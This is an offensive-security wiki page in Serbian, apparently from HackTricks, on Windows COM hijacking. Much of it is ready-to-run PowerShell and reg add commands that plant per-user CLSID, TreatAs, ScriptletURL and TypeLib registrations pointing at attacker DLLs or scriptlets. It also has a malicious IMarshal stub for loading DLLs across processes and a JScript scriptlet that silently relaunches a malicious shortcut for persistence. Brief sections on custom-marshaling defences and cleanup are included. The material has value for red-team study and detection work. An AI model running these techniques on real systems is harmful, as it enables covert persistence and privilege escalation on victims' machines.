# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Pretraga nepostojećih COM komponenti

Pošto korisnici mogu da menjaju vrednosti HKCU, **COM Hijacking** može da se koristi kao **persistence mechanism**. Pomoću `procmon`-a lako je pronaći COM registre koji se traže, ali još ne postoje i koje bi napadač mogao da kreira. Klasični filteri:

- Operacije **RegOpenKey**.
- gde je _Result_ **NAME NOT FOUND**.
- i gde se _Path_ završava sa **InprocServer32**.

Korisne varijacije tokom pretrage:

- Potražite i nedostajuće ključeve **`LocalServer32`**. Neke COM klase su out-of-process serveri i pokrenuće EXE koji kontroliše napadač umesto DLL-a.
- Pored `InprocServer32`, pretražite i operacije registra **`TreatAs`** i **`ScriptletURL`**. Noviji sadržaji o detekciji i tekstovi o malware-u često ih ističu jer su mnogo ređi od uobičajenih COM registracija i zato predstavljaju snažan signal.
- Prilikom kloniranja registracije u HKCU, preuzmite legitimni **`ThreadingModel`** iz originalnog `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32`. Pogrešan model često onemogućava aktivaciju i čini hijack upadljivim.<sup>[[3]](#references)</sup>
- Na 64-bitnim sistemima proverite i 64-bitni i 32-bitni prikaz (`procmon.exe` naspram `procmon64.exe`, `HKLM\Software\Classes` i `HKLM\Software\Classes\WOW6432Node`), jer 32-bitne aplikacije mogu da razreše drugačiju COM registraciju.

Kada odlučite koji nepostojeći COM želite da imitirate, izvršite sledeće komande. _Budite oprezni ako odlučite da imitirate COM koji se učitava svakih nekoliko sekundi, jer to može biti preterano._

```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

### COM komponente Task Scheduler-a koje se mogu preoteti

Windows zadaci koriste Custom Triggers za pozivanje COM objekata, a pošto se izvršavaju preko Task Scheduler-a, lakše je predvideti kada će biti pokrenuti.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      $usersSid = "S-1-5-32-545"
      $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

      if ($Task.Principal.GroupId -eq $usersGroup)
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Pregledom izlaznih podataka možete izabrati, na primer, zadatak koji će se izvršavati **svaki put kada se korisnik prijavi**.

Ako zatim potražite CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** u **HKEY\CLASSES\ROOT\CLSID**, kao i u HKLM i HKCU, obično ćete ustanoviti da vrednost ne postoji u HKCU.

```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
               ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```

Zatim možete samo da kreirate HKCU unos i svaki put kada se korisnik prijavi, vaš backdoor će se pokrenuti.

## Nevažeće COM registracije i prilagođeni marshaling

COM registracija na nivou cele mašine može postati primitiv za DLL planting bez menjanja registra. Potražite vrednost `InprocServer32` čiji DLL ne postoji i čija završna putanja može da se kreira ili izmeni sa niskim privilegijama. Ako postavite DLL sa tačno određenim imenom, svaki proces koji aktivira CLSID učitaće napadačev kod. U primeru CrossDevice, registrovana putanja bila je `%PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll`, pa je standardni korisnik mogao da kreira direktorijum i DLL koji nedostaju.<sup>[[5]](#references)</sup>

### `IMarshal` kao primitiv za učitavanje DLL-a između procesa

COM obično predstavlja pokazivač na interfejs pomoću standardnog `OBJREF`-a koji upućuje primaoca nazad na originalni objekat. Objekat koji implementira `IMarshal` može umesto toga da proizvede prilagođeni `OBJREF`. Njegova metoda `GetUnmarshalClass` navodi CLSID koda koji će rekonstruisati objekat u procesu primaoca. Taj CLSID ne mora da identifikuje originalni objekat. COM ga razrešava kao in-process server i učitava registrovani DLL pre nego što prosledi poziv traženoj metodi interfejsa.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

Minimalna zlonamerna implementacija treba samo da zameni nevažeći CLSID u `GetUnmarshalClass`.<sup>[[5]](#references)</sup>

```c
HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
    REFIID riid, void *pv, DWORD dest_context,
    void *dest_context_ptr, DWORD flags, CLSID *clsid) override
{
    return CLSIDFromString(L"{DANGLING-CLSID}", clsid);
}
```

Prosledite ovaj objekat kroz parametar proxied metode, kao što je `[in] IUnknown *`. Druga mogućnost je `CoGetInstanceFromIStorage`, pri čemu custom-marshaled objekat takođe implementira dovoljno funkcionalnosti interfejsa `IStorage` da prođe lokalne provere. Automatsko unmarshaling u udaljenom serveru razrešava zamenjeni CLSID, pa se DLL učitava pre poziva ciljne metode.<sup>[[5]](#references)</sup>

Ovaj primitiv nije ograničen na registracije koje nedostaju. Može i da primora primaoca da učita postojeći DLL custom-unmarshaler-a i izloži greške u njegovoj putanji učitavanja ili unmarshaling-a.<sup>[[5]](#references)</sup>

Lanac zahteva sve sledeće uslove:<sup>[[5]](#references)</sup>

1. CLSID vidljiv na nivou računara pokazuje na nedostajući ili zamenjiv in-process DLL.
2. Napadač može da smesti taj DLL na razrešenu putanju.
3. Aktivabilni out-of-process COM server radi na željenom nivou privilegija.
4. Server prihvata custom marshaling i izlaže proxied poziv koji prenosi objekat napadača preko granice procesa.

### Pronađite nevažeće in-process servere

[OleViewDotNet](https://github.com/tyranid/oleviewdotnet) i [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools) mogu da nabroje COM bazu podataka računara i testiraju svaki server pomoću uobičajenog Win32 razrešavanja modula. To je bolje od `Test-Path`, jer neke registracije sadrže samo ime datoteke i oslanjaju se na putanju pretrage učitavača.<sup>[[5]](#references)</sup>

```powershell
function Test-ComServer($Server) {
    try {
        Use-NtObject ($lib = Import-Win32Module -Path $Server -Flags AsDataFile) { $true }
    } catch { $false }
}

$db = Get-ComDatabase -LoadMode MachineOnly
$classes = Get-ComClass -Database $db -ServerType InProcServer32
$classes | Where-Object { -not (Test-ComServer $_.DefaultServer) } |
    Sort-Object DefaultServer | Select-Object Name, DefaultServer
```

Tretirajte rezultat kao listu kandidata, a ne kao dokaz mogućnosti eksploatacije. Razrešite putanju onako kako to radi loader, a zatim pregledajte DACL prvog postojećeg roditeljskog direktorijuma i predviđenog DLL-a ako već postoji. Nedostajuća datoteka je korisna samo ako napadač može da kreira ili zameni putanju koju će COM zaista razrešiti.<sup>[[5]](#references)</sup>

### Izaberite i pokrenite privilegovanog primaoca

Pregledajte COM klase kandidate u potrazi za `RunAs`, vezom sa servisom, dostupnim interfejsima i RPC proxy-jima. Klasa konfigurisana za `SYSTEM`, ali bez povezanog servisa sa imenom, možda neće moći da se direktno aktivira jer RPCSS ne može da je pokrene. U tom slučaju potražite neprivilegovani okidač koji pokreće njen host, kao što je izvršni zakazani zadatak, i ponovite sve preduslove u vidu imenovanog događaja ili IPC-a koji održavaju server aktivnim.<sup>[[5]](#references)</sup>

Na primer, ranjivi lanac Shell Create Object Handler pokrenuo je svoj host tako što je kreirao očekivani globalni događaj pre pozivanja zakazanog zadatka koji pokreće izvršnu datoteku korisnika.<sup>[[5]](#references)</sup>

```powershell
$ev = New-NtEvent -Win32Path 'Global\ShellCreateObjectTaskReadyEvent' -InitialState $false
Start-ScheduledTask -TaskPath '\Microsoft\Windows\Shell\' -TaskName 'CreateObjectTask'
$ev.Wait()
$object = New-ComObject -Clsid '135fd325-45b7-4c30-89f8-4386961669f0'
```

Mapirajte dobijenu referencu objekta nazad do njenog hosta i proverite identitet i politiku marshaling-a. Zatim nabrojte interfejse i konvertujte njihove proksije u IDL da biste pronašli ulazni parametar kao što je `IUnknown *` koji će marshaling-om preneti lažni objekat.<sup>[[5]](#references)</sup>

```powershell
$objref = Get-ComObjRef -Object $object
Get-ComProcess -ProcessId $objref.ProcessId |
    Select-Object Name, User, CustomMarshalAllowed

Get-ComInterface -Object $object
Get-ComInterface -Name '<interface>' | ConvertTo-ComSourceCode -Parse
```

### Zaštite od custom marshaling-a

Odgovarajući primalac ne sme da odbacuje nepouzdane custom marshalere. Dve zaštite koje važe za ceo proces su `EOAC_NO_CUSTOM_MARSHAL` u capabilities prosleđenim funkciji `CoInitializeSecurity` i `COMGLB_UNMARSHALING_POLICY_STRONG`, postavljen preko `IGlobalOptions::Set`. Kada su dostupni simboli, odgovarajuće stanje može da se proveri u `combase!gCapabilities` i `combase!g_GLBOPT_UnmarshalingPolicy`; NtObjectManager prikazuje rezultat kao `CustomMarshalAllowed` kada njegov parser procesa podržava tu verziju Windows-a.<sup>[[5]](#references)</sup>

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` omogućava emulaciju jednog CLSID-a pomoću drugog.<sup>[[4]](#references)</sup> Iz ofanzivne perspektive, to znači da možete da ostavite originalni CLSID netaknutim, kreirate drugi CLSID za trenutnog korisnika koji pokazuje na `scrobj.dll`, a zatim preusmerite stvarni COM objekat na zlonamerni pomoću `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Ovo je korisno kada:

- ciljna aplikacija već instancira stabilan CLSID pri prijavi ili pokretanju aplikacije
- želite preusmeravanje samo preko registra umesto zamene originalnog `InprocServer32`
- želite da izvršite lokalni ili udaljeni `.sct` scriptlet preko vrednosti `ScriptletURL`

Primer postupka (prilagođeno iz javno dostupne prakse Atomic Red Team i ranijih istraživanja zloupotrebe COM registra):

```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```

Beleške:

- `scrobj.dll` čita vrednost `ScriptletURL` i izvršava navedeni `.sct`, tako da payload može da bude lokalna datoteka ili da se preuzme udaljeno preko HTTP/HTTPS.
- `TreatAs` je naročito koristan kada je originalna COM registracija potpuna i stabilna u HKLM, jer je potrebno samo malo preusmeravanje za korisnika, umesto preslikavanja celog stabla.
- Za proveru bez čekanja na uobičajeni okidač, možete ručno instancirati lažni ProgID/CLSID pomoću `rundll32.exe -sta <ProgID-or-CLSID>` ako ciljna klasa podržava STA aktivaciju.

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) definišu COM interfejse i učitavaju se pomoću `LoadTypeLib()`. Kada se COM server instancira, OS može da učita i povezani TypeLib tako što proverava ključeve registratora pod `HKCR\TypeLib\{LIBID}`. Ako se putanja TypeLib zameni **moniker** vrednošću, npr. `script:C:\...\evil.sct`, Windows će izvršiti scriptlet kada se TypeLib razreši — čime se dobija prikrivena perzistencija koja se aktivira pri korišćenju uobičajenih komponenti.

Ovo je primećeno u slučaju kontrole Microsoft Web Browser (često je učitavaju Internet Explorer, aplikacije koje ugrađuju WebBrowser, pa čak i `explorer.exe`).<sup>[[1]](#references)[[2]](#references)</sup>

### Koraci (PowerShell)

1) Identifikujte TypeLib (LIBID) koji koristi CLSID sa visokom učestalošću. Primer CLSID-a koji često zloupotrebljavaju lanci malware-a: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).

```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```

2) Podesite TypeLib putanju za korisnika tako da pokazuje na lokalni scriptlet pomoću monikera `script:` (nisu potrebna administratorska prava):

```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```

3) Postavite minimalni JScript `.sct` koji ponovo pokreće vaš primarni payload (npr. `.lnk` koji se koristi u početnom lancu):

```xml
<?xml version="1.0"?>
<scriptlet>
  <registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
  <script language="JScript">
    <![CDATA[
      try {
        var sh = new ActiveXObject('WScript.Shell');
        // Re-launch the malicious LNK for persistence
        var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
        sh.Run(cmd, 0, false);
      } catch(e) {}
    ]]>
  </script>
</scriptlet>
```

4) Aktiviranje – otvaranje IE-a, aplikacije koja ugrađuje WebBrowser kontrolu ili čak uobičajene aktivnosti Explorera učitaće TypeLib i izvršiti scriptlet, ponovo aktivirajući vaš lanac pri prijavljivanju/ponovnom pokretanju sistema.

Čišćenje
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```

Beleške
- Istu logiku možete primeniti i na druge često korišćene COM komponente; uvek prvo pronađite stvarni `LIBID` u `HKCR\CLSID\{CLSID}\TypeLib`.
- Na 64-bitnim sistemima možete dodati i potključ `win64` za 64-bitne potrošače.

## References

- [1] [Otmite TypeLib – nova tehnika COM perzistencije (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – ZipLine kampanja: sofisticirani phishing napad usmeren na kompanije u SAD](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Ponovno razmatranje COM hijackinga (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [CLSID ključ (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
- [5] [Project Zero - Tehnike eksploatacije Windowsa: viseće registracije COM objekata](https://projectzero.google/2026/09/windows-dangling-com.html)
- [6] [Microsoft Learn - IMarshal interfejs](https://learn.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal)
- [7] [Microsoft Open Specifications - MS-DCOM OBJREF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31)
{{#include ../../banners/hacktricks-training.md}}

